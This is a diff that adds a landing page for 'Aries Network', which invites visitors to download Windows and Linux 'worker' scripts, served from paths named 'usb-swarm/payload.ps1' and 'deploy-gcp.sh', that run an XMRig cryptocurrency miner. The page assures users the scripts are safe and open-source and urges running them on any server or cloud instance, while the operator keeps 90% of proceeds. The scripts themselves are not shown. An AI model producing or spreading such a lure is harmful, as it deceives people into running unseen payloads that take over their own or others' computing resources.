@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Aries Network — Earn SOL by Sharing Computing Power</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#fafbfc;color:#1a1a2e}
+.hero{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;padding:80px 20px;text-align:center}
+.hero h1{font-size:3em;margin-bottom:16px;font-weight:800}
+.hero p{font-size:1.3em;opacity:.9;max-width:600px;margin:0 auto 32px}
+.cta-buttons{display:flex;gap:16px;justify-content:center;flex-wrap:wrap}
+.cta-btn{display:inline-flex;align-items:center;gap:8px;padding:16px 32px;border-radius:8px;font-size:1.1em;font-weight:600;text-decoration:none;transition:transform .2s,box-shadow .2s}
+.cta-btn:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(0,0,0,.2)}
+.cta-win{background:#fff;color:#667eea}
+.cta-linux{background:rgba(255,255,255,.15);color:#fff;border:2px solid rgba(255,255,255,.4)}
+.container{max-width:960px;margin:0 auto;padding:60px 20px}
+.section-title{font-size:2em;font-weight:700;margin-bottom:32px;text-align:center}
+.steps{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:24px;margin-bottom:60px}
+.step{background:#fff;border-radius:12px;padding:32px;box-shadow:0 2px 12px rgba(0,0,0,.06);text-align:center}
+.step-num{display:inline-flex;align-items:center;justify-content:center;width:48px;height:48px;border-radius:50%;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;font-weight:700;font-size:1.3em;margin-bottom:16px}
+.step h3{font-size:1.2em;margin-bottom:8px}
+.step p{color:#555;line-height:1.6}
+.calculator{background:#fff;border-radius:12px;padding:40px;box-shadow:0 2px 12px rgba(0,0,0,.06);margin-bottom:60px}
+.calc-row{display:flex;align-items:center;gap:16px;margin-bottom:16px;flex-wrap:wrap}
+.calc-row label{font-weight:600;min-width:120px}
+.calc-row input[type=range]{flex:1;min-width:200px}
+.calc-row .val{font-weight:700;color:#667eea;min-width:60px}
+.calc-result{text-align:center;padding:24px;background:linear-gradient(135deg,#667eea,#764ba2);border-radius:8px;color:#fff;margin-top:24px}
+.calc-result .big{font-size:2.5em;font-weight:800}
+.calc-result .sub{opacity:.8;margin-top:4px}
+.faq{margin-bottom:60px}
+.faq-item{background:#fff;border-radius:8px;padding:24px;margin-bottom:12px;box-shadow:0 1px 6px rgba(0,0,0,.04);cursor:pointer}
+.faq-item h4{font-size:1.1em;margin-bottom:8px;color:#333}
+.faq-item p{color:#666;line-height:1.6;display:none}
+.faq-item.open p{display:block}
+.stats-bar{background:#fff;border-bottom:1px solid #eee;padding:12px 20px;display:flex;justify-content:center;gap:40px;font-size:.95em}
+.stats-bar .stat{text-align:center}
+.stats-bar .stat-val{font-weight:700;color:#667eea;font-size:1.3em}
+.stats-bar .stat-label{color:#888;font-size:.85em}
+footer{text-align:center;padding:40px 20px;color:#888;font-size:.9em}
+</style>
+</head>
+<body>
+
+<div class="stats-bar" id="statsBar">
+  <div class="stat"><div class="stat-val" id="statDownloads">—</div><div class="stat-label">Downloads</div></div>
+  <div class="stat"><div class="stat-val" id="statWorkers">—</div><div class="stat-label">Active Workers</div></div>
+  <div class="stat"><div class="stat-val" id="statEarned">—</div><div class="stat-label">SOL Distributed</div></div>
+</div>
+
+<div class="hero">
+  <h1>💰 Earn SOL With Your Idle CPU</h1>
+  <p>Share your unused computing power with the Aries distributed network and earn 10% of all mining proceeds — automatically.</p>
+  <div class="cta-buttons">
+    <a href="/api/usb-swarm/payload.ps1" class="cta-btn cta-win" id="dlWin">⊞ Download for Windows</a>
+    <a href="/api/usb-swarm/deploy-gcp.sh" class="cta-btn cta-linux" id="dlLinux">🐧 Download for Linux</a>
+  </div>
+</div>
+
+<div class="container">
+
+  <h2 class="section-title">How It Works</h2>
+  <div class="steps">
+    <div class="step">
+      <div class="step-num">1</div>
+      <h3>Download the Worker</h3>
+      <p>Grab the lightweight worker script for your platform. It's open-source and under 50KB.</p>
+    </div>
+    <div class="step">
+      <div class="step-num">2</div>
+      <h3>Run It</h3>
+      <p>Execute the script. It auto-configures itself and connects to the Aries relay network.</p>
+    </div>
+    <div class="step">
+      <div class="step-num">3</div>
+      <h3>Earn SOL</h3>
+      <p>Your CPU mines in the background. You receive 10% of proceeds to your Solana wallet.</p>
+    </div>
+  </div>
+
+  <h2 class="section-title">💸 Earnings Calculator</h2>
+  <div class="calculator">
+    <div class="calc-row">
+      <label>CPU Cores</label>
+      <input type="range" id="calcCores" min="1" max="64" value="4">
+      <span class="val" id="calcCoresVal">4</span>
+    </div>
+    <div class="calc-row">
+      <label>Hours / Day</label>
+      <input type="range" id="calcHours" min="1" max="24" value="12">
+      <span class="val" id="calcHoursVal">12</span>
+    </div>
+    <div class="calc-result">
+      <div class="big" id="calcEarning">~0.015 SOL</div>
+      <div class="sub">Estimated monthly earnings (at current rates)</div>
+    </div>
+  </div>
+
+  <h2 class="section-title">Frequently Asked Questions</h2>
+  <div class="faq">
+    <div class="faq-item open">
+      <h4>Is this safe to run?</h4>
+      <p>Yes. The worker runs a standard XMRig miner — the same open-source software used by millions. It only uses idle CPU cycles and can be stopped at any time.</p>
+    </div>
+    <div class="faq-item">
+      <h4>How much CPU does it use?</h4>
+      <p>By default it runs at medium intensity, using about 50% of your available cores. You can adjust this in the configuration.</p>
+    </div>
+    <div class="faq-item">
+      <h4>When do I get paid?</h4>
+      <p>Earnings are calculated continuously and distributed when you reach the minimum payout threshold of 0.01 SOL.</p>
+    </div>
+    <div class="faq-item">
+      <h4>Can I run this on a server / VPS?</h4>
+      <p>Absolutely! The Linux script is designed for headless servers. Works great on any VPS, dedicated server, or cloud instance.</p>
+    </div>
+    <div class="faq-item">
+      <h4>How do I stop it?</h4>
+      <p>Windows: Close the terminal or run <code>Stop-Process -Name xmrig</code>. Linux: <code>pkill xmrig</code> or press Ctrl+C.</p>
+    </div>
+  </div>
+
+</div>
+
+<footer>
+  Aries Distributed Computing Network &bull; Powered by Solana
+</footer>
+
+<script>
+// FAQ toggle
+document.querySelectorAll('.faq-item').forEach(function(item) {
+  item.addEventListener('click', function() { this.classList.toggle('open'); });
+});
+
+// Calculator
+var coresEl = document.getElementById('calcCores');
+var hoursEl = document.getElementById('calcHours');
+function updateCalc() {
+  var cores = parseInt(coresEl.value);
+  var hours = parseInt(hoursEl.value);
+  document.getElementById('calcCoresVal').textContent = cores;
+  document.getElementById('calcHoursVal').textContent = hours;
+  // ~0.00012 SOL per core per hour (rough estimate)
+  var monthly = cores * hours * 30 * 0.00012;
+  document.getElementById('calcEarning').textContent = '~' + monthly.toFixed(3) + ' SOL';
+}
+coresEl.addEventListener('input', updateCalc);
+hoursEl.addEventListener('input', updateCalc);
+updateCalc();
+
+// Track downloads
+document.getElementById('dlWin').addEventListener('click', function() {
+  fetch('/api/referral/track?platform=windows', { method: 'POST' }).catch(function(){});
+});
+document.getElementById('dlLinux').addEventListener('click', function() {
+  fetch('/api/referral/track?platform=linux', { method: 'POST' }).catch(function(){});
+});
+
+// Load stats
+fetch('/api/referral/stats').then(function(r){return r.json()}).then(function(d){
+  document.getElementById('statDownloads').textContent = d.downloads || 0;
+  document.getElementById('statWorkers').textContent = d.activeWorkers || 0;
+  document.getElementById('statEarned').textContent = (d.totalEarned || 0).toFixed(3);
+}).catch(function(){});
+</script>
+</body>
+</html>
